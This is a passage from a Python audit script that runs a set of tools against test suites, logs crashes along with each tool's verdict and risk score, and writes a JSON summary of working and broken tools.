                print(f"[+] [PASS]   [{suite_id}] {tool_id:<28} -> {res.verdict.value:<10} Score:{res.risk_score:<3}")

        except Exception as e:
            broken_tools.append({
                "tool_id": tool_id,
                "suite_id": suite_id,
                "reasons": [f"Exception crashed tool: {str(e)}"],
                "verdict": "ERROR",
                "score": -1,
                "summary": str(e)
            })
            print(f"[!] [CRASH]  [{suite_id}] {tool_id:<28} -> EXCEPTION: {str(e)}")

    print("\n" + "=" * 80)
    print(f" AUDIT COMPLETE: {len(working_tools)} Working, {len(broken_tools)} Broken / Need Adjustment")
    print("=" * 80)

    # Output JSON summary for machine and human review
    output_path = backend_dir / "audit_exact_testcases_results.json"
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump({
            "working_count": len(working_tools),
            "broken_count": len(broken_tools),
            "broken_tools": broken_tools
        }, f, indent=2)

    print(f"[+] Detailed findings written to: {output_path.name}")

if __name__ == "__main__":
    run_audit()
